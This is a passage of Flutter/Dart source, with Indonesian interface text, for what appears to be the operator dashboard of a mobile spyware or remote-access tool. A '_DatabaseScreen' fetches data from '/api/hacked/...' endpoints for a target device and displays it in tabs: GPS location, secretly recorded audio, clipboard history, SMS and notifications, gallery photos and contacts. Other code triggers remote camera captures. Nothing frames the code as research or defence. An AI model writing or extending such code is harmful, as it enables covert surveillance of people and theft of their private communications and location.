                      width: 16, height: 16, colorFilter: const ColorFilter.mode(Colors.white, BlendMode.srcIn))))),

                
                GestureDetector(
                  onTap: _frameBase64 != null ? _capturePhoto : null,
                  child: Container(
                    width: 52, height: 52,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: _frameBase64 != null ? Colors.white : Colors.white24,
                      border: Border.all(
                        color: (_frameBase64 != null ? Colors.white : Colors.white38),
                        width: 2.5),
                      boxShadow: _frameBase64 != null ? [BoxShadow(
                        color: _blue.withOpacity(0.5), blurRadius: 14, spreadRadius: 1)] : []),
                    child: Center(child: SvgPicture.string(AppSvgIcons.cameraAlt,
                      width: 22, height: 22,
                      colorFilter: ColorFilter.mode(
                        _frameBase64 != null ? Colors.black87 : Colors.white38,
                        BlendMode.srcIn))))),

                
                const SizedBox(width: 38),
              ]),
            )),
        ]),
      ),
    );
  }
}

Future<void> _openMapsUrl(BuildContext context, String url, {VoidCallback? fallback}) async {
  final uri = Uri.parse(url);
  try {
    if (await canLaunchUrl(uri)) {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
      return;
    }
  } catch (_) {}
  await Clipboard.setData(ClipboardData(text: url));
  if (fallback != null) {
    fallback();
  } else if (context.mounted) {
    ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
      content: Text('Link Maps Disalin!', style: TextStyle(fontFamily: 'ShareTechMono')),
      backgroundColor: Color(0xFF10B981)));
  }
}

class _AudioPlayerDialog extends StatefulWidget {
  final String audioBase64;
  final dynamic duration;
  final bool inline;
  const _AudioPlayerDialog({required this.audioBase64, this.duration, this.inline = false});
  @override
  State<_AudioPlayerDialog> createState() => _AudioPlayerDialogState();
}

class _AudioPlayerDialogState extends State<_AudioPlayerDialog> {
  static const _audioColor = Color(0xFFF43F5E);
  final AudioPlayer _player = AudioPlayer();
  PlayerState _state = PlayerState.stopped;
  Duration _position = Duration.zero;
  Duration _total    = Duration.zero;
  bool _loading = false;

  @override
  void initState() {
    super.initState();
    _player.onPlayerStateChanged.listen((s) { if (mounted) setState(() => _state = s); });
    _player.onPositionChanged.listen((p)    { if (mounted) setState(() => _position = p); });
    _player.onDurationChanged.listen((d)    { if (mounted) setState(() => _total = d); });
    _player.onPlayerComplete.listen((_)     {
      if (mounted) setState(() { _state = PlayerState.stopped; _position = Duration.zero; });
    });
  }

  @override
  void dispose() { _player.dispose(); super.dispose(); }

  Future<void> _togglePlay() async {
    if (widget.audioBase64.isEmpty) return;
    if (_state == PlayerState.playing) { await _player.pause(); return; }
    if (_state == PlayerState.paused)  { await _player.resume(); return; }
    setState(() => _loading = true);
    try {
      await _player.play(BytesSource(base64Decode(widget.audioBase64)));
    } catch (e) {
      if (mounted) ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('Gagal play: $e', style: const TextStyle(fontFamily: 'ShareTechMono')),
          backgroundColor: Colors.red));
    }
    if (mounted) setState(() => _loading = false);
  }

  String _fmt(Duration d) =>
    '${d.inMinutes.remainder(60).toString().padLeft(2,'0')}:${d.inSeconds.remainder(60).toString().padLeft(2,'0')}';

  @override
  Widget build(BuildContext context) {
    final isPlaying = _state == PlayerState.playing;
    final isPaused  = _state == PlayerState.paused;
    final progress  = _total.inMilliseconds > 0
      ? (_position.inMilliseconds / _total.inMilliseconds).clamp(0.0, 1.0) : 0.0;
    final sizeKb = (widget.audioBase64.length * 0.75 / 1024).toStringAsFixed(1);

    final player = Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _audioColor.withOpacity(0.07),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _audioColor.withOpacity(0.35))),
      child: Column(mainAxisSize: MainAxisSize.min, children: [
        Row(children: [
          Container(width: 44, height: 44,
            decoration: BoxDecoration(color: _audioColor.withOpacity(0.15), borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _audioColor.withOpacity(0.4))),
            child: Center(child: SvgPicture.string(AppSvgIcons.audioFile, width: 22, height: 22,
              colorFilter: const ColorFilter.mode(_audioColor, BlendMode.srcIn)))),
          const SizedBox(width: 12),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            const Text('REKAMAN AUDIO', style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: _audioColor, letterSpacing: 1)),
            const SizedBox(height: 3),
            Text('${_fmt(_position)} / ${_total.inSeconds > 0 ? _fmt(_total) : "~${widget.duration ?? 0}s"}',
              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white70)),
            Text('$sizeKb KB', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white38)),
          ])),
          GestureDetector(
            onTap: _loading ? null : _togglePlay,
            child: Container(
              width: 48, height: 48,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: const LinearGradient(colors: [_audioColor, Color(0xFFE11D48)]),
                boxShadow: [BoxShadow(color: _audioColor.withOpacity(0.4), blurRadius: 12)]),
              child: _loading
                ? const Padding(padding: EdgeInsets.all(12),
                    child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                : Center(child: SvgPicture.string(
                    isPlaying
                      ? '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16" rx="1"/><rect x="14" y="4" width="4" height="16" rx="1"/></svg>'
                      : '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>',
                    width: 20, height: 20,
                    colorFilter: const ColorFilter.mode(Colors.white, BlendMode.srcIn))))),
        ]),
        const SizedBox(height: 12),
        SliderTheme(
          data: SliderTheme.of(context).copyWith(
            trackHeight: 3,
            thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 6),
            overlayShape: const RoundSliderOverlayShape(overlayRadius: 12),
            activeTrackColor: _audioColor,
            inactiveTrackColor: _audioColor.withOpacity(0.15),
            thumbColor: _audioColor,
            overlayColor: _audioColor.withOpacity(0.2)),
          child: Slider(
            value: progress,
            onChanged: _total.inMilliseconds > 0
              ? (v) => _player.seek(Duration(milliseconds: (v * _total.inMilliseconds).round()))
              : null)),
        if (isPlaying || isPaused)
          Center(child: Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
            decoration: BoxDecoration(color: _audioColor.withOpacity(0.15), borderRadius: BorderRadius.circular(20)),
            child: Row(mainAxisSize: MainAxisSize.min, children: [
              Container(width: 6, height: 6, decoration: BoxDecoration(
                color: isPlaying ? _audioColor : Colors.white38, shape: BoxShape.circle,
                boxShadow: isPlaying ? [BoxShadow(color: _audioColor, blurRadius: 4)] : [])),
              const SizedBox(width: 5),
              Text(isPlaying ? 'PLAYING' : 'PAUSED',
                style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8,
                  color: isPlaying ? _audioColor : Colors.white38, letterSpacing: 1)),
            ]))),
      ]));

    if (widget.inline) return player;
    return AlertDialog(
      backgroundColor: const Color(0xFF0D1F35),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20),
        side: BorderSide(color: _audioColor.withOpacity(0.4))),
      contentPadding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
      titlePadding: const EdgeInsets.fromLTRB(16, 16, 16, 8),
      title: Row(children: [
        SvgPicture.string(AppSvgIcons.mic, width: 18, height: 18,
          colorFilter: const ColorFilter.mode(_audioColor, BlendMode.srcIn)),
        const SizedBox(width: 8),
        const Text('AUDIO DITERIMA', style: TextStyle(fontFamily: 'Orbitron', fontSize: 12, color: Colors.white, letterSpacing: 1)),
      ]),
      content: player,
      actions: [
        TextButton(
          onPressed: () { _player.stop(); Navigator.pop(context); },
          child: const Text('Tutup', style: TextStyle(fontFamily: 'Orbitron', color: _audioColor, fontSize: 11))),
      ]);
  }
}

class _ScanlinePainter extends CustomPainter {
  final Color color;
  const _ScanlinePainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = color..strokeWidth = 0.5;
    const spacing = 6.0;
    for (double y = 0; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(_ScanlinePainter oldDelegate) => oldDelegate.color != color;
}

class _DatabaseScreen extends StatefulWidget {
  final String deviceId;
  final String deviceName;
  final String role;
  const _DatabaseScreen({required this.deviceId, required this.deviceName, required this.role});
  @override
  State<_DatabaseScreen> createState() => _DatabaseScreenState();
}

class _DatabaseScreenState extends State<_DatabaseScreen> with SingleTickerProviderStateMixin {
  static const _purple = Color(0xFF8B5CF6);
  static const _green  = Color(0xFF10B981);
  static const _red    = Color(0xFFEF4444);
  static const _amber  = Color(0xFFF59E0B);
  static const _blue   = Color(0xFF3B82F6);
  static const _cyan   = Color(0xFF06B6D4);

  late TabController _tabCtrl;
  bool _loading = false;

  List<Map<String, dynamic>> _gpsList   = [];
  List<Map<String, dynamic>> _audioList = [];
  Map<String, dynamic>? _clipboardData;
  Map<String, dynamic>? _appUsageData;
  List<Map<String, dynamic>> _smsMessages = [];
  List<Map<String, dynamic>> _gallery = [];
  List<Map<String, dynamic>> _contacts = [];

  @override
  void initState() {
    super.initState();
    _tabCtrl = TabController(length: 7, vsync: this);
    _loadAll();
  }

  @override
  void dispose() {
    _tabCtrl.dispose();
    super.dispose();
  }

  Future<void> _loadAll() async {
    setState(() => _loading = true);
    await Future.wait([
      _fetchList('/api/hacked/gps-list/${widget.deviceId}',          'list',      (l) => _gpsList   = l),
      _fetchList('/api/hacked/audio-list/${widget.deviceId}',         'list',      (l) => _audioList  = l),
      _fetchJson('/api/hacked/clipboard-result/${widget.deviceId}','clipboard', (d) => _clipboardData = d),
      _fetchJson('/api/hacked/app-usage-result/${widget.deviceId}','usage',     (d) => _appUsageData = d),
      _fetchList('/api/hacked/sms-messages/${widget.deviceId}?type=new', 'messages', (l) => _smsMessages = l),
      _fetchList('/api/hacked/gallery/${widget.deviceId}',        'photos',    (l) => _gallery = l),
      _fetchList('/api/hacked/contacts/${widget.deviceId}',       'contacts',  (l) => _contacts = l),
    ]);
    if (_gpsList.isEmpty) {
      try {
        final r = await ApiService.get('/api/hacked/gps-result/${widget.deviceId}');
        if (r['success'] == true && r['gps'] != null && mounted) setState(() => _gpsList = [r['gps'] as Map<String, dynamic>]);
      } catch (_) {}
    }
    if (_audioList.isEmpty) {
      try {
        final r = await ApiService.get('/api/hacked/audio-result/${widget.deviceId}');
        if (r['success'] == true && r['audio'] != null && mounted) setState(() => _audioList = [r['audio'] as Map<String, dynamic>]);
      } catch (_) {}
    }
    if (mounted) setState(() => _loading = false);
  }

  Future<void> _fetchJson(String path, String key, void Function(Map<String, dynamic>) onData) async {
    try {
      final res = await ApiService.get(path);
      if (res['success'] == true && res[key] != null && mounted) {
        setState(() => onData(res[key] as Map<String, dynamic>));
      }
    } catch (_) {}
  }

  Future<void> _fetchList(String path, String key, void Function(List<Map<String, dynamic>>) onData) async {
    try {
      final res = await ApiService.get(path);
      if (res['success'] == true && mounted) {
        final list = List<Map<String, dynamic>>.from(res[key] ?? []);
        setState(() => onData(list));
      }
    } catch (_) {}
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.darkBg,
      appBar: AppBar(
        backgroundColor: AppTheme.darkBg,
        elevation: 0,
        leading: IconButton(
          icon: SvgPicture.string(AppSvgIcons.arrowBackIos, width: 16, height: 16, colorFilter: const ColorFilter.mode(Colors.white54, BlendMode.srcIn)),
          onPressed: () => Navigator.pop(context)),
        title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          const Text('DATABASE', style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: Colors.white, letterSpacing: 3, fontWeight: FontWeight.bold)),
          Text(widget.deviceName, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white38)),
        ]),
        actions: [
          IconButton(
            icon: _loading
              ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(color: _purple, strokeWidth: 2))
              : SvgPicture.string(AppSvgIcons.refresh, width: 20, height: 20, colorFilter: const ColorFilter.mode(_purple, BlendMode.srcIn)),
            onPressed: _loading ? null : _loadAll),
        ],
        bottom: TabBar(
          controller: _tabCtrl,
          isScrollable: true,
          indicatorColor: _purple,
          indicatorWeight: 2,
          labelStyle: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 9),
          unselectedLabelColor: Colors.white30,
          labelColor: _purple,
          tabs: const [
            Tab(text: 'GPS'),
            Tab(text: 'AUDIO'),
            Tab(text: 'CLIPBOARD'),
            Tab(text: 'APP USAGE'),
            Tab(text: 'SMS'),
            Tab(text: 'GALERI'),
            Tab(text: 'KONTAK'),
          ]),
      ),
      body: TabBarView(
        controller: _tabCtrl,
        children: [
          _buildGpsTab(),
          _buildAudioTab(),
          _buildClipboardTab(),
          _buildAppUsageTab(),
          _buildSmsTab(),
          _buildGalleryTab(),
          _buildContactsTab(),
        ]));
  }

  Widget _emptyBox(String msg, {String icon = AppSvgIcons.inbox, Color color = _purple}) {
    return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      SvgPicture.string(icon, width: 48, height: 48, colorFilter: ColorFilter.mode(color.withOpacity(0.3), BlendMode.srcIn)),
      const SizedBox(height: 12),
      Text(msg, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white30)),
    ]));
  }

  Widget _buildGpsTab() {
    if (_gpsList.isEmpty) return _emptyBox('Belum Ada Data GPS', icon: AppSvgIcons.locationOff, color: _green);
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _gpsList.length,
      itemBuilder: (_, i) {
        final gps = _gpsList[_gpsList.length - 1 - i];
        final lat = (gps['latitude']  as num?)?.toDouble() ?? 0;
        final lng = (gps['longitude'] as num?)?.toDouble() ?? 0;
        final acc = (gps['accuracy']  as num?)?.toDouble() ?? 0;
        final ts  = gps['timestamp']  as int? ?? 0;
        final dt  = ts > 0 ? DateTime.fromMillisecondsSinceEpoch(ts).toString().substring(0, 16) : '-';
        return Container(
          margin: const EdgeInsets.only(bottom: 14),
          child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
            _dbCard(_green, AppSvgIcons.locationOn, 'GPS #${_gpsList.length - i}', [
              _dbRow('Latitude',  lat.toStringAsFixed(6)),
              _dbRow('Longitude', lng.toStringAsFixed(6)),
              _dbRow('Akurasi',   '${acc.toStringAsFixed(1)} m'),
              _dbRow('Waktu',     dt),
              _dbRow('Provider',  gps['provider'] as String? ?? '-'),
            ]),
            const SizedBox(height: 6),
            GestureDetector(
              onTap: () => _openMapsUrl(context, 'https://maps.google.com/?q=$lat,$lng'),
              child: Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(color: _green.withOpacity(0.1), borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: _green.withOpacity(0.4))),
                child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  SvgPicture.string(AppSvgIcons.mapIcon, width: 16, height: 16, colorFilter: const ColorFilter.mode(_green, BlendMode.srcIn)),
                  const SizedBox(width: 8),
                  const Text('Buka Di Google Maps', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: _green)),
                ]))),
          ]));
      });
  }

  Widget _buildAudioTab() {
    if (_audioList.isEmpty) return _emptyBox('Belum Ada Rekaman Audio', icon: AppSvgIcons.micOff, color: _red);
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _audioList.length,
      itemBuilder: (_, i) {
        final audio  = _audioList[_audioList.length - 1 - i];
        final dur    = audio['duration']    as int?    ?? 0;
        final b64    = audio['audioBase64'] as String? ?? '';
        final ts     = audio['recordedAt']  as int?    ?? 0;
        final dt     = ts > 0 ? DateTime.fromMillisecondsSinceEpoch(ts).toString().substring(0, 16) : '-';
        final sizeKb = (b64.length * 0.75 / 1024).toStringAsFixed(1);
        return Container(
          margin: const EdgeInsets.only(bottom: 14),
          child: Column(children: [
            _dbCard(_red, AppSvgIcons.audioFile, 'REKAMAN #${_audioList.length - i}', [
              _dbRow('Durasi',  '~${dur}s'),
              _dbRow('Ukuran',  '$sizeKb KB'),
              _dbRow('Format',  audio['mimeType'] as String? ?? 'audio/aac'),
              _dbRow('Direkam', dt),
            ]),
            const SizedBox(height: 6),
            _AudioPlayerDialog(audioBase64: b64, duration: dur, inline: true),
          ]));
      });
  }

  Widget _buildClipboardTab() {
    final hist = _clipboardData != null
      ? List<Map<String, dynamic>>.from(_clipboardData!['history'] ?? [])
      : <Map<String, dynamic>>[];
    if (hist.isEmpty) return _emptyBox('Belum Ada Data Clipboard', icon: AppSvgIcons.contentPasteOff, color: _amber);
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: hist.length,
      itemBuilder: (_, i) {
        final item = hist[i];
        final text = item['text'] as String? ?? '';
        final ts   = item['time'] as int? ?? 0;
        final dt   = ts > 0 ? DateTime.fromMillisecondsSinceEpoch(ts).toString().substring(0, 16) : '-';
        return Container(
          margin: const EdgeInsets.only(bottom: 10),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(12),
            border: Border.all(color: _amber.withOpacity(0.2))),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(text, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white)),
            const SizedBox(height: 6),
            Text(dt, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white30)),
          ]));
      });
  }

  Widget _buildAppUsageTab() {
    final apps = _appUsageData != null
      ? List<Map<String, dynamic>>.from(_appUsageData!['apps'] ?? [])
      : <Map<String, dynamic>>[];
    if (apps.isEmpty) return _emptyBox('Belum Ada Data Penggunaan App', icon: AppSvgIcons.barChart, color: _blue);
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: apps.length,
      itemBuilder: (_, i) {
        final app  = apps[i];
        final name = app['appName'] as String? ?? 'Unknown';
        final mins = app['timeMin'] as int? ?? 0;
        final maxMins = (apps.first['timeMin'] as int? ?? 1).clamp(1, 9999);
        final ratio = (mins / maxMins).clamp(0.0, 1.0);
        return Container(
          margin: const EdgeInsets.only(bottom: 10),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(12),
            border: Border.all(color: _blue.withOpacity(0.15))),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: [
              Expanded(child: Text(name, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white, fontWeight: FontWeight.bold))),
              Text('${mins}m', style: TextStyle(fontFamily: 'Orbitron', fontSize: 10, color: _blue)),
            ]),
            const SizedBox(height: 8),
            ClipRRect(
              borderRadius: BorderRadius.circular(4),
              child: LinearProgressIndicator(
                value: ratio, minHeight: 4,
                backgroundColor: _blue.withOpacity(0.1),
                valueColor: AlwaysStoppedAnimation<Color>(_blue))),
            const SizedBox(height: 4),
            Text(app['packageName'] as String? ?? '', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: Colors.white24)),
          ]));
      });
  }

  Widget _buildSmsTab() {
    if (_smsMessages.isEmpty) return _emptyBox('Belum Ada SMS/Notifikasi', icon: AppSvgIcons.smsFailed, color: _cyan);
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _smsMessages.length,
      itemBuilder: (_, i) {
        final msg    = _smsMessages[i];
        final sender = msg['sender'] as String? ?? 'Unknown';
        final text   = msg['content'] as String? ?? '';
        final app    = msg['appName'] as String? ?? '';
        final time   = msg['time'] as String? ?? '';
        return Container(
          margin: const EdgeInsets.only(bottom: 10),
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(12),
            border: Border.all(color: _cyan.withOpacity(0.2))),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: [
              Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                decoration: BoxDecoration(color: _cyan.withOpacity(0.15), borderRadius: BorderRadius.circular(4)),
                child: Text(app, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, color: _cyan))),
              const SizedBox(width: 8),
              Expanded(child: Text(sender, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white, fontWeight: FontWeight.bold))),
              Text(time, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9, color: Colors.white30)),
            ]),
            const SizedBox(height: 8),
            Text(text, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Colors.white70)),
          ]));
      });
  }

  Widget _buildGalleryTab() {
    if (_gallery.isEmpty) return _emptyBox('Belum Ada Galeri', icon: AppSvgIcons.photoLibrary, color: _cyan);
    return GridView.builder(
      padding: const EdgeInsets.all(12),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 3, crossAxisSpacing: 4, mainAxisSpacing: 4),
      itemCount: _gallery.length,
      itemBuilder: (_, i) {
        final photo = _gallery[i];
        final b64   = photo['thumbnailBase64'] as String? ?? '';
        return ClipRRect(
          borderRadius: BorderRadius.circular(6),
          child: b64.isNotEmpty
            ? Image.memory(base64Decode(b64), fit: BoxFit.cover)
            : Container(color: _purple.withOpacity(0.1),
                child: SvgPicture.string(AppSvgIcons.imageOutlined, width: 24, height: 24, colorFilter: ColorFilter.mode(_purple.withOpacity(0.3), BlendMode.srcIn))));
      });
  }

  Widget _buildContactsTab() {
    if (_contacts.isEmpty) return _emptyBox('Belum Ada Kontak', icon: AppSvgIcons.contacts, color: _green);
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _contacts.length,
      itemBuilder: (_, i) {
        final c     = _contacts[i];
        final name  = c['name']  as String? ?? 'Unknown';
        final phone = c['phone'] as String? ?? '';
        return Container(
          margin: const EdgeInsets.only(bottom: 8),
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
          decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(10),
            border: Border.all(color: _green.withOpacity(0.15))),
          child: Row(children: [
            Container(width: 34, height: 34,
              decoration: BoxDecoration(color: _green.withOpacity(0.1), borderRadius: BorderRadius.circular(8),
                border: Border.all(color: _green.withOpacity(0.3))),
              child: Center(child: Text(name.isNotEmpty ? name[0].toUpperCase() : '?',
                style: TextStyle(fontFamily: 'Orbitron', fontSize: 13, color: _green)))),
            const SizedBox(width: 12),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text(name, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 12, color: Colors.white, fontWeight: FontWeight.bold)),
              Text(phone, style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white38)),
            ])),
          ]));
      });
  }

  Widget _dbCard(Color color, String icon, String title, List<Widget> rows) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: AppTheme.cardBg, borderRadius: BorderRadius.circular(14),
        border: Border.all(color: color.withOpacity(0.3))),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          SvgPicture.string(icon, width: 16, height: 16, colorFilter: ColorFilter.mode(color, BlendMode.srcIn)),
          const SizedBox(width: 8),
          Text(title, style: TextStyle(fontFamily: 'Orbitron', fontSize: 11, color: color, letterSpacing: 2)),
        ]),
        const Divider(color: Colors.white12, height: 20),
        ...rows,
      ]));
  }

  Widget _dbRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Row(children: [
        SizedBox(width: 90, child: Text('$label:', style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white38))),
        Expanded(child: Text(value, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Colors.white, fontWeight: FontWeight.bold))),
      ]));
  }
}
